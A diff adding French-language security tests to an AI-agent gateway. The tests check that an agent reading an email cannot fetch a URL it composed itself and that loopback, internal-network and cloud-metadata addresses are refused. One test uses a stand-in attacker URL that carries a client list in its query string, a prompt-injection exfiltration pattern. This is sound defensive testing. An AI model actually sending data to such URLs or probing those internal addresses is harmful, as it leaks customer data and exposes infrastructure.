@@ -537,6 +537,22 @@ console.log("\n3 quater. Revue du 26/09/2026 : réglages de l'instance, données
   const retourOauth = await (await appel("/helix/oauth/retour?error=access_denied&error_description=TEXTE-PIRATE-7788")).text();
   verifier("la page publique de retour d'autorisation n'affiche pas le texte de l'appelant", !retourOauth.includes("TEXTE-PIRATE-7788"), retourOauth.slice(0, 120));
 
+  // Le web gardé des employés (webGarde.ts, 27/09/2026) : sans réseau, seulement ce qui se refuse avant toute connexion.
+  {
+    const { pathToFileURL: versUrl2 } = await import("node:url");
+    const web = await import(versUrl2(join(RACINE, "gateway", "src", "webGarde.ts")).href);
+    web.ouvrirSurveillance("emp-essai", ["Voir https://exemple.org/devis-42 pour le détail."]);
+    const composee = await web.callTool("web__lire", { adresse: "https://attaquant.example/?d=liste-des-clients" }, "emp-essai");
+    verifier("web des employés : pendant un mail reçu, une adresse que l'agent compose est refusée", !composee.ok && /déjà vue/.test(composee.content), composee.content.slice(0, 120));
+    web.noterVues("emp-essai", "résultat d'un outil : https://exemple.org/autre-page");
+    web.fermerSurveillance("emp-essai");
+    for (const [nom, adresse] of [["la boucle locale", "http://127.0.0.1:8787/health"], ["le réseau interne", "http://10.0.0.5/"], ["les métadonnées d'hébergeur", "http://169.254.169.254/latest/meta-data/"]]) {
+      const r = await web.callTool("web__lire", { adresse }, "hors-mail");
+      verifier(`web des employés : ${nom} est refusé(e)`, !r.ok && /Refusé/.test(r.content), r.content.slice(0, 120));
+    }
+    const { modifie: modifie2 } = await import(versUrl2(join(RACINE, "gateway", "src", "approbation.ts")).href);
+    verifier("web des employés : chercher et lire une page sont des lectures (pas de carte forcée pendant un mail)", !modifie2("web__chercher") && !modifie2("web__lire"), "traités comme modification");
+  }
   // La barrière : portée par outil, et ce qui se confirme toujours.
   const { pathToFileURL: versUrl } = await import("node:url");
   const barriere = await import(versUrl(join(RACINE, "gateway", "src", "approbation.ts")).href);
